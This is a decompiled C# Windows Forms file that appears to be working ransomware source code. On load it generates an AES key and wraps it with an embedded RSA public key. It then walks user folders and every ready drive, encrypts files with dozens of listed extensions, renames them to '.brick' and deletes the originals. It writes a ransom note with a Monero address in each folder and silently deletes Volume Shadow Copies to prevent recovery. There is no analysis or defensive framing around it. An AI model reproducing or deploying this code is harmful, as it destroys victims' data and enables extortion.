using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace l25de3a0fbaa3009886613f5e62b92f2;

public class MainForm : Form
{
	public AesCryptoServiceProvider l_b4739b77;

	public RNGCryptoServiceProvider dad708cc;

	public string iapoisjd;

	public string blakc = "<RSAKeyValue><Modulus>r7ZCGjpS56/JCtSQ4V1cd1uzuR0EaY1QevtZZzsPApcYYE3I1BS/4Z6uJ7rCwHzXJoV+3QCaEvnJJclB02loMpbhLpLtCkdVrsJugVi2g2jV5IoZ6HiAbG6zSINIPXO2J+lK/ymd3aD+iWhvDqv7LZ+DrVaTVu+VULu+Dlr4IC+7gGFfUQWpVHNI/vZ9069l22KDZpWT69pJbWIOXCA7eW0JHBP/uSK+Gzkti56qEFLDzoAuSDWYF6zQpB21VY72pZYd8qCES0qrmlILe66M39rAjQA+0vEvNk1b0fk3gBJ3CqHxVVxQLAQac2T3s9omaH2+c1ruq2yU+yk0yf/q1wpxUQImGxMfbLKH58JYGSoJsOZdit7HPRHK7GO9l3m8ZWjzmkkLvx0CpDXfWhSCMrYakINCZYaMa76Q3eE4JPIFy3kVzTZq0iWXM91pZx8qQRsb9r6k8+H6Etrv9DgBD6ps7nipDurF8BrLX2kzKRefXARmst+UAm04/horgWH16UO26Jdp+P+97rvkbihKDYNY12q1NNYLY/FDx/JL3xn/qRShk0mjz4QrwC50EKEN2eKxNIzVI0UGYv9lj1iooAk9mD9NwWW3v8iUM56R1p9gkUw7cNl/HiQqLk2FH4Q+nS7h0GBQRzinUUsk+YueorHYpJXi24EXAFc9kQQlkPE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private IContainer components = null;

	public MainForm()
	{
		InitializeComponent();
	}

	private void MainFormLoad(object sender, EventArgs e)
	{
		byte[] array = new byte[32];
		dad708cc = new RNGCryptoServiceProvider();
		dad708cc.GetBytes(array);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		l_b4739b77 = new AesCryptoServiceProvider();
		l_b4739b77.Mode = CipherMode.CBC;
		l_b4739b77.Key = array;
		rSACryptoServiceProvider.FromXmlString(blakc);
		iapoisjd = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(array, fOAEP: false));
		string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
		if (Directory.Exists(pathRoot + "\\Users"))
		{
			e4rt5y67(pathRoot + "\\Users");
		}
		if (Directory.Exists(pathRoot + "\\Documents and Settings"))
		{
			e4rt5y67(pathRoot + "\\Documents and Settings");
		}
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array2 = drives;
			foreach (DriveInfo driveInfo in array2)
			{
				if (driveInfo.Name != pathRoot && driveInfo.IsReady)
				{
					e4rt5y67(driveInfo.Name);
				}
			}
		}
		catch
		{
		}
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "vssadmin delete shadows /all /quiet";
		process.StartInfo = processStartInfo;
		process.Start();
		array = null;
		l_b4739b77.Key = null;
	}

	private void ec_fl(string dadf)
	{
		byte[] array = new byte[16];
		dad708cc.GetBytes(array);
		l_b4739b77.IV = array;
		byte[] array2 = File.ReadAllBytes(dadf);
		byte[] bytes;
		try
		{
			bytes = l_b4739b77.CreateEncryptor().TransformFinalBlock(array2, 0, array2.Length);
		}
		catch
		{
			return;
		}
		string text = dadf + "." + Convert.ToBase64String(array).Replace(":", "$").Replace("/", "#") + ".brick";
		if (checked(256 - text.Length) > 0)
		{
			try
			{
				File.WriteAllBytes(text, bytes);
			}
			catch
			{
				return;
			}
			try
			{
				File.Delete(dadf);
			}
			catch
			{
			}
		}
	}

	private void e4rt5y67(string dfi)
	{
		string[] files = Directory.GetFiles(dfi);
		foreach (string dhddh in files)
		{
			shsadhi(dhddh);
		}
		files = Directory.GetDirectories(dfi);
		foreach (string dfi2 in files)
		{
			if (!dfi.Contains("Windows") && !dfi.Contains("Program Files") && !dfi.Contains("boot"))
			{
				e4rt5y67(dfi2);
			}
		}
		File.WriteAllText(dfi + "\\ID_GENERATE.TXT", "Read the form text.\r\nDON'T TOUCH THIS FILE!\r\nMonero public key:\r\n43dQ9yguiktUxQrQXcVpEvJtMoKsSfjc1CUpgtmrGRoNFBEEMZiSGPgVo75tWfoeBA6W6NudjgH2c84xcoLTx1xVKigk7wR\r\nID:\r\n" + iapoisjd);
	}

	private void shsadhi(string dhddh)
	{
		List<string> list = new List<string>();
		list.Add(".txt");
		list.Add(".doc");
		list.Add(".xls");
		list.Add(".pdf");
		list.Add(".ini");
		list.Add(".cfg");
		list.Add(".conf");
		list.Add(".xlsx");
		list.Add(".docx");
		list.Add(".xlsm");
		list.Add(".docm");
		list.Add(".ppt");
		list.Add(".ps1");
		list.Add(".vb");
		list.Add(".cer");
		list.Add(".pfx");
		list.Add(".reg");
		list.Add(".zip");
		list.Add(".rar");
		list.Add(".7z");
		list.Add(".pptm");
		list.Add(".pptx");
		list.Add(".rtf");
		list.Add(".tex");
		list.Add(".odt");
		list.Add(".wpd");
		list.Add(".ogg");
		list.Add(".m4a");
		list.Add(".flv");
		list.Add(".wma");
		list.Add(".zpl");
		list.Add(".midi");
		list.Add(".csv");
		list.Add(".xml");
		list.Add(".dot");
		list.Add(".log");
		list.Add(".apk");
		list.Add(".bat");
		list.Add(".mdb");
		list.Add(".accdb");
		list.Add(".java");
		list.Add(".wsf");
		list.Add(".com");
		list.Add(".gif");
		list.Add(".ico");
		list.Add(".jpg");
		list.Add(".jpeg");
		list.Add(".ico");
		list.Add(".tif");
		list.Add(".tiff");
		list.Add(".html");
		list.Add(".htm");
		list.Add(".cpp");
		list.Add(".c");
		list.Add(".vob");
		list.Add(".svg");
		list.Add(".pdb");
		list.Add(".css");
		list.Add(".py");
		list.Add(".php");
		list.Add(".asp");
		list.Add(".xhtml");
		list.Add(".key");
		list.Add(".odp");
		list.Add(".ods");
		list.Add(".xlr");
		list.Add(".swf");
		list.Add(".nds");
		list.Add(".bin");
		list.Add(".asm");
		list.Add(".ac");
		list.Add(".flac");
		list.Add(".jtd");
		IList<string> list2 = list;
		foreach (string item in list2)
		{
			if (list2.ToString() != "ID_GENERATE.TXT" && Path.GetExtension(dhddh) == item)
			{
				ec_fl(dhddh);
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(818, 553));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("MainForm");
		((Control)this).set_Text("l25de3a0fbaa3009886613f5e62b92f2");
		((Form)this).add_Load((EventHandler)MainFormLoad);
		((Control)this).ResumeLayout(false);
	}
}
